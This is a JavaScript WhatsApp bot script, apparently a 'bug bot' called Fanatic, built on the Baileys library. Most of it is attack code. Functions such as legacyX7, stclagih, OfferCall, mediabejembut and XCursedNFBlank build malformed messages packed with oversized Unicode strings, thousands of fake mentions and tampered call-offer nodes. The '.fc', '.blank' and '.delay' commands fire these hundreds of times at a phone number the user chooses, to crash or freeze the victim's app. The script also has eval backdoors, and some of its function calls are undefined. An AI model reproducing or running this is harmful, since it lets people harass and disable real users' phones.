console.clear();
require('./setting/config')

const { default: baileys, downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { 
GroupSettingChange, 
WAGroupMetadata, 
emitGroupParticipantsUpdate, 
emitGroupUpdate, 
WAGroupInviteMessageGroupMetadata, 
GroupMetadata, 
Headers,
WA_DEFAULT_EPHEMERAL,
getAggregateVotesInPollMessage, 
generateWAMessageContent, 
areJidsSameUser, 
useMultiFileAuthState, 
fetchLatestBaileysVersion,
makeCacheableSignalKeyStore, 
makeWaSocket,
makeInMemoryStore,
MediaType,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
initInMemoryKeyStore,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
ReconnectMode,
WAContextInfo,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
MediaConnInfo,
URL_REGEX,
WAUrlInfo,
WAMediaUpload,
mentionedJid,
processTime,
Browser,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
Browsers,
DisconnectReason,
WASocket,
getStream,
WAProto,
isBaileys,
AnyMessageContent,
templateMessage,
InteractiveMessage,
Header
} = require("@whiskeysockets/baileys");

//END
//EXPORTS BASIC MODULE

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const jimp = require("jimp")
const axios = require('axios')
const fsx = require('fs-extra')
const sharp = require('sharp')
const crypto = require('crypto')
const yts = require('yt-search')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const jsobfus = require('javascript-obfuscator');
const { ocrSpace } = require("ocr-space-api-wrapper");
const { JSDOM } = require('jsdom')
const { spawn, exec, execSync } = require('child_process')
//END
//MODULE MESSAGE + PREFIX

module.exports = Ril = async (Ril, m, chatUpdate, store) => {
    try {
        var body = (
            m.mtype === "conversation" ? m.message.conversation || "[Conversation]" :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption || "[Image]" :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption || "[Video]" :
            m.mtype === "audioMessage" ? m.message.audioMessage.caption || "[Audio]" :
            m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "[Sticker]" :
            m.mtype === "documentMessage" ? m.message.documentMessage.fileName || "[Document]" :
            m.mtype === "contactMessage" ? "[Contact]" :
            m.mtype === "locationMessage" ? m.message.locationMessage.name || "[Location]" :
            m.mtype === "liveLocationMessage" ? "[Live Location]" :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text || "[Extended Text]" :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId || "[Button Response]" :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId || "[List Response]" :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId || "[Template Button Reply]" :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson)?.id || "[Interactive Response]" :
            m.mtype === "pollCreationMessage" ? "[Poll Creation]" :
            m.mtype === "reactionMessage" ? m.message.reactionMessage.text || "[Reaction]" :
            m.mtype === "ephemeralMessage" ? "[Ephemeral]" :
            m.mtype === "viewOnceMessage" ? "[View Once]" :
            m.mtype === "productMessage" ? m.message.productMessage.product?.name || "[Product]" :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text || "[Message Context]" :
            "[Unknown Type]"
        );
        var budy = (typeof m.text == 'string' ? m.text : '');
        var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? 
        body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" 
                      : global.prefa ?? global.prefix
  
//END
//DATA TAMBAHAN + PELENGKAP
const { 
smsg, 
tanggal, 
getTime, 
isUrl, 
sleep, 
clockString, 
runtime, 
fetchJson, 
getBuffer, 
jsonformat, 
format, 
parseMention, 
getRandom, 
getGroupAdm, 
generateProfilePicture 
} = require('./System/x1')

//END

const Owner = JSON.parse(fs.readFileSync('./Access/Own.json'))
const Premium = JSON.parse(fs.readFileSync('./Access/Prem.json'))
const CMD = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const BotNum = await Ril.decodeJid(Ril.user.id)
const CreatorOnly = [BotNum, ...Owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const PremOnly = [BotNum, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const fatkuns = m.quoted || m;
const quoted = 
  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
  m.quoted ? m.quoted :
  m;
const qtext = q = args.join(" ")
const qtek = m.quoted && m.quoted.message && m.quoted.message.imageMessage;
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await Ril.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = m.isGroup ? await groupMetadata.participants : ''
const GroupAdm = m.isGroup ? await getGroupAdm(participants) : ''
const BotAdm = m.isGroup ? GroupAdm.includes(BotNum) : false
const Adm = m.isGroup ? GroupAdm.includes(m.sender) : false
const pushname = m.pushName || "No Name"
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
    ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
};
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta', // Zona waktu WIB
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});
const mime = (quoted.msg || quoted).mimetype || ''

const Rilyzy = fs.readFileSync(`./System/Thumb.jpg`)

if (!Ril.public) {
if (!CreatorOnly) return
}
//- P -\\
if (command) {
  if (m.isGroup) {
    // Log untuk pesan grup
    console.log(chalk.bgBlue.white.bold(`# New Message`));
    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Time : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🌐 Group Name : ${groupName} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  } else {
    // Log untuk pesan privat
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Time : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🌐 Group Name : No In Group \n` +
      ` 🔑 Group Id : No In Group \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  }
}

//FUNCTION
async function legacyX7(target) {
const xput = "𑜦𑜠".repeat(1000) + "ꦾ".repeat(1000);
  try {
    const message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: xput,
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -6666666666,
                degreesLongitude: 6666666666,
                name: xput,
                address: "\u0000",
              },
            },
            body: {
              text: "LegacyX7 Attack🍁" + xput,
            },
            nativeFlowResponseMessage: {
              name: "payment_transaction_details",
              paramsJson: "\u08A0".repeat(10000),
              version: 3
            },
            contextInfo: {
              participant: target,
                mentionedJid: [
                  "0@s.whatsapp.net",
                 ...Array.from(
                 { length: 1900 },
                 () =>
                 "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                ),
              ],
            },
          }, 
        },
      },
    };
    
    //const msg = generateWAMessageFromContent(target, message, {});

    await Ril.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
      });

    console.log("LegacyX7 Succes Attack!✅");
  } catch (error) {
    console.log("❌ error:\n" + error);
  }
}

async function stclagih(target) {
  await Ril.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",

        name: "kontol⃝҉⃝" + "ꦾ".repeat(40000),
        publisher: "ꦽ".repeat(20000),
        stickers: [],

        fileLength: 12260,
        fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
        fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
        mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",

        directPath:
          "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",

        height: 9999,
        width: 9999,

        mediaKeyTimestamp: "1747502082",

        isAnimated: false,
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,

        emojis: ["😹", "😹", "😂", "😂"],

        contextInfo: {
          mentionedJid: [
            "131338822@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            ),
          ],
          remoteJid: "X",
          participant: target,
          stanzaId: "1234567890ABCDEF",

          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000,
            },
          },
        },

        packDescription: "",
        trayIconFileName:
          "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",

        thumbnailDirectPath:
          "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",

        thumbnailSha256:
          "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
        thumbnailEncSha256:
          "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,

        imageDataHash:
          "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",

        stickerPackSize: "3680054",
        stickerPackOrigin: "USER_CREATED",
      },
    },
    {
      participant: { jid: target },
    }
  );
}
async function OfferCall(target){
    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");

    let devices = (
        await Ril.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await Ril.assertSessions(devices);

    let Memek = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch { }
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let memek = Memek();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = Ril.createParticipantNodes.bind(Ril);
    let yntkts = Ril.encodeWAMessage?.bind(Ril);

    Ril.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length)
            return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (Ril.patchMessageBeforeSending?.(message, recipientJids) ?? message);
        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = Ril.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {

                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y)
                    msg = dsmMessage;

                let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

                return memek.mutex(jid, async () => {
                    let { type, ciphertext } = await Ril.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });

                    if (type === 'pkmsg')
                        shouldIncludeDeviceIdentity = true;

                    return {
                        tag: 'to',
                        attrs: { jid },
                        content: [{
                            tag: 'enc',
                            attrs: { v: '2', type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );

        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };

    let awik = crypto.randomBytes(32);
    let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);

    let {
        nodes: destinations,
        shouldIncludeDeviceIdentity
    } = await Ril.createParticipantNodes(
        devices,
        { conversation: "y" },
        { count: '0' }
    );

    let callNode = {
        tag: "call",
        attrs: {
            to: target,
            id: Ril.generateMessageTag(),
            from: Ril.user.id
        },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                "call-creator": Ril.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                {
                    tag: "video",
                    attrs: {
                        orientation: "0",
                        screen_width: "1920",
                        screen_height: "1080",
                        device_orientation: "0",
                        enc: "vp8",
                        dec: "vp8"
                    }
                },
                { tag: "net", attrs: { medium: "3" } },
                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations },
                ...(shouldIncludeDeviceIdentity
                    ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(Ril.authState.creds.account, true)
                    }]
                    : []
                )
            ]
        }]
    };
    
    await Ril.sendNode(callNode);
}
async function mediabejembut(target) {
  const msg = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  await Ril.relayMessage("status@broadcast", msg, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });
}

// end
const zets = {
  key: {
	fromMe: false,
	  participant: "0@s.whatsapp.net",
		remoteJid: "status@broadcast"
	  },
		message: {
		  orderMessage: {
		  orderId: "2029",
		  thumbnail: Rilyzy, 
		    itemCount: `9999999`,
		    status: "INQUIRY",
		    surface: "CATALOG",
		    message: `#Dapzy4Note`,
		    token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
		  }
	    },
	    contextInfo: {
		  mentionedJid: [m.sender],
		  forwardingScore: 999,
		  isForwarded: true
		}
	  }

const ReplyRil = (teks) => {
  return Ril.sendMessage(
    m.chat,
    {
      text: teks,
      contextInfo: {
        mentionedJid: [m.chat],
        forwardingScore: 99999999,
        isForwarded: true,
        externalAdReply: {
          title: "#Fanatic",
          body: "© Fanatic",
          mediaType: 1,
          renderLargerThumbnail: false,
          showAdAttribution: false,
          thumbnailUrl: "https://daffa-dev.my.id/upload/oaiko.jpg",
          sourceUrl: ""
        }
      }
    },
    { quoted: zets }
  );
}; 

async function XCursedNFBlank(target) {
  await Ril.relayMessage(
    target,
    {
      newsletterAdminInviteMessage: {
        newsletterJid: "99999@newsletter",
        newsletterName: " " + "".repeat(30000),
        caption: "".repeat(77777) + "".repeat(25000),
        inviteExpiration: Date.now(),
        contextInfo: {
          isForwarded: true,
          forwardingScore: 99,
          quotedMessage: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "\u0000",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: Buffer.from([0x00]),
            }
          }
        }
      }
    },
    {
      participant: { jid: target }
    }
  );
} 


//END

const RunTime = `_${runtime(process.uptime())}_`
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
switch(command) {
//ALL MENU CASE {
case 'menu': {
await Ril.sendMessage(m.chat, {
  interactiveMessage: {
     title: `─ Holla🤓 ${m.pushName}, Déjame presentarme, mi nombre es Fanatic, soy un bot multifunción que te ayudará a masacrar a los perdedores de este mundo.

─ ! Information
❏ Creator : PrassTzy!-
❏ Script : Fanatic
❏ Version : 1.0.0
❏ Runtime : ${runtime(process.uptime())}

 ===============
    *Bug Menu*
 ===============
➳ .fc ( 62××× ) 
➳ .blank ( 62××× )
➳ .delay ( 62××× )

================
─ ! Owner menu
================
≽ .addown ( 62××× )
≽ .delown ( 62××× )
≽ .addprem ( 62××× )
≽ .delprem ( 62××× )
≽ .public
≽ .self 
`, 
  footer: "FanaticBug",
     image: { url: './System/lgeX7.jpg' },
        nativeFlowMessage: {
           messageParamsJson: JSON.stringify({
              limited_time_offer: {
                text: "Fanatic ",
                url: "t.me/Prasszxd2",
                copy_code: "#PrassTzy",
                 expiration_time: Date.now() * 999
                },
              bottom_sheet: {
                in_thread_buttons_limit: 2, 
                divider_indices: [1, 2, 3, 4, 5, 999],
                list_title: "#PrassTzy X Fanatik",
                 button_title: "</>"
                },
              tap_target_configuration: {
                title: " X ",
                description: "bomboclard",
                canonical_url: "https://t.me/Prasszxd2",
                domain: "shop.example.com",
                button_index: 0
              }
            }),
           buttons: [
              {
                 name: "single_select",
                 buttonParamsJson: JSON.stringify({
                   has_multiple_buttons: true
                })
                },
                {
                 name: "call_permission_request",
                 buttonParamsJson: JSON.stringify({
                   has_multiple_buttons: true
                })
                },
                {
                 name: "single_select",
                 buttonParamsJson: JSON.stringify({      
                    title: "#Allmenu",
                    sections: [
                 {
                 title: "#Fanatic Wrld",
                    highlight_label: "Recommend",
                    rows: [
                 {
                 title: "Fanatic Wrld",
                    description: "Menampilkan ( Fanatic Wrld )",
                    id: "xx",
                 }, 
                 {
                 title: "Prasstzy",
                    description: "Menampilkan ( Fanatic )",
                    id: "xx"
                 }
              ]
           }
        ],
     has_multiple_buttons: true
  })
},
{
  name: "cta_url",
    buttonParamsJson: JSON.stringify({
      display_text: "#Contact!", 
        url: "https://t.me/Prasszxd2",
        merchant_url: "https://t.me/Prasszxd2"
       })
     }
   ]
 }
}
}, { quoted: zets });
break 
}
//=======================\\
//===========case OwnMenu/Fun============\\
case 'addowner': case 'addown':
if (!CreatorOnly) return ReplyRil("*Your Not Owner*")
  if (!args[0]) return ReplyRil(`Penggunaan : ${prefix + command} Example ${prefix + command} 628xx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let loadnum = await Ril.onWhatsApp(numero + `@s.whatsapp.net`);
  if (loadnum.length == 0) return ReplyRil(`Number Invalid!!!`);
  owner.push(numero);
  Premium.push(numero);
  fs.writeFileSync('./Access/Own.json', JSON.stringify(owner));
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyRil(`Number ${numero} succes add to database!`);
  break;
//=======================\\
case 'delowner': case 'delown':
if (!CreatorOnly) return ReplyRil("*Your Not Owner*")
  if (!args[0]) return ReplyRil(`Penggunaan: ${prefix + command} Example:\n ${prefix + command} 628xx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Owner.indexOf(numero2);
  numload = Premium.indexOf(numero2);
  Owner.splice(numeroX, 1);
  Premium.splice(numload, 1);
  fs.writeFileSync('./Access/Own.json', JSON.stringify(Owner));
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyRil(`Number ${numero2} succes delate to database!`);
  break;
//=======================\\
case 'addpremium': case 'addprem':
if (!CreatorOnly) return ReplyRil("*Your Not Owner*")
  if (!args[0]) return ReplyRil(`Penggunaan: ${prefix + command} Example ${prefix + command} 628xx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let Invalid = await Ril.onWhatsApp(numero + `@s.whatsapp.net`);
  if (Invalid.length == 0) return ReplyRil(`Number Invalid!!!`);
  Premium.push(numero);
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyRil(`Number ${numero} succes add to database!`);
  break;
//=======================\\
case 'delpremium': case 'delprem':
if (!CreatorOnly) return ReplyRil("*Your Not Owner*")
  if (!args[0]) return ReplyRil(`Penggunaan ${prefix + command} Example ${prefix + command} 628xx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Premium.indexOf(numero2);
  Premium.splice(numeroX, 1);
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyRil(`Number ${numero2} succes delate to database!`);
  break;
//=======================\\
case 'public': {
  if (!CreatorOnly) return ReplyRil("*You're Not My Owner*");

  Ril.public = true;
  ReplyRil(`*Success: Changed Mode from Self to Public*`);
}
break;
//=======================\\
case 'self': case 'private': {
  if (!CreatorOnly) return ReplyRil("*You're Not My Owner*");

  Ril.public = false;
  ReplyRil(`*Success: Changed Mode from Public to Self*`);
}
break;

case "eval": {
                if (!budy.startsWith(".eval")) return;
                
                const args = budy.trim().split(' ').slice(1).join(' ');
                if (!args) return ReplyRil(`*ex:* ${prefix + command} m.chat`);
                let teks;
                try {
                    teks = await eval(`(async () => { ${args.startsWith("return") ? "" : "return"} ${args} })()`);
                } catch (e) {
                    teks = e;
                } finally {
                    await ReplyRil(require('util').format(teks));
                }
            }
            break;

case "info": {
  const messType = m.quoted ? { [m.quoted.mtype]:m.quoted } : { [m.mtype]:m.message };
  const formattedJson = JSON.stringify(messType, null, 2);
  Ril.relayMessage(m.chat, {
    "extendedTextMessage": {
      "text": formattedJson 
    }
  }, {});
}
break;

case "swgrup": case "swgc": {
                const quoted = m.quoted ? m.quoted : m;
                const mime = (quoted.msg || quoted).mimetype || "";
                const caption = m.body.replace(/^\.swgrup\s*/i, "").trim();
                const jid = m.chat;
                
                if (/image/.test(mime)) {
                    const buffer = await quoted.download();
                    await Ril.sendMessage(jid, {
                        groupStatusMessage: {
                            image: buffer,
                            caption
                        }
                    });
                    ReplyRil("Succes Add Status To Group")
                } else if (/video/.test(mime)) {
                    const buffer = await quoted.download();
                    await Ril.sendMessage(jid, {
                        groupStatusMessage: {
                            video: buffer,
                            caption
                        }
                    });
                    ReplyRil("Succes Add Status To Group")
                } else if (/audio/.test(mime)) {
                    const buffer = await quoted.download();
                    await Ril.sendMessage(jid, {
                        groupStatusMessage: {
                            audio: buffer
                        }
                    });
                    ReplyRil("Succes Add Status To Group")
                } else if (caption) {
                    await Ril.sendMessage(jid, {
                        groupStatusMessage: {
                            text: caption
                        }
                    });
                    ReplyRil("Succes Add Status To Group")
                } else {
                    await ReplyRil(`reply media atau tambahkan teks.\nexample: ${prefix + command} (reply image/video/audio) hai ini saya`);
                }
            }
            break;
//=======================\\

//===========Case Bug!============\\
case 'blank': {
    if (!PremOnly) return ReplyRil("*You are not a Premium User*");
    if (!q) return ReplyRil(`*Syntax Eror*\nExample: ${command} 628xxx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyRil(`*Syntax Eror*\nExample: ${command} 628xxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    ReplyRil(`*Success! Send Bug to ${target}*`);

    for (let r = 0; r < 300; r++) {
    await stclagih(target)
    await mediabejembut(target)
    await OfferCall(target)
    await XCursedNFBlank(target)
    await sleep(100)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'delay': { 
    if (!PremOnly) return ReplyRil("*You are not a Premium User*");
    if (!q) return ReplyRil(`*Syntax Eror*\nExample: ${command} 628xxx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyRil(`*Syntax Eror*\nExample: ${command} 628xxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    ReplyRil(`*Success! Send Bug to ${target}*`);

    for (let r = 0; r < 300; r++) {
    await mediabejembut(target)
    await xCNFSTUNTLOCT(target)
    await sleep(100)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'fc': {
    if (!PremOnly) return ReplyRil("*You are not a Premium User*");
    if (!q) return ReplyRil(`*Syntax Eror*\nExample: ${command} 628xxx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyRil(`*Syntax Eror*\nExample: ${command} 628xxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    ReplyRil(`*Success! Send Bug to ${target}*`);

    for (let r = 0; r < 200; r++) {
    await OfferCall(target)
    await legacyX7(target)
    await sleep(100)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
//=======================\\
//END
//======================================================\\
default:
if (budy.startsWith('=>')) {
if (!CreatorOnly) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return ReplyRil(bang)}
try {
ReplyRil(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
ReplyRil(String(e))}}
if (budy.startsWith('>')) {
if (!CreatorOnly) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await ReplyRil(evaled)
} catch (err) {
await ReplyRil(String(err))
}
}
//=========================================================\\
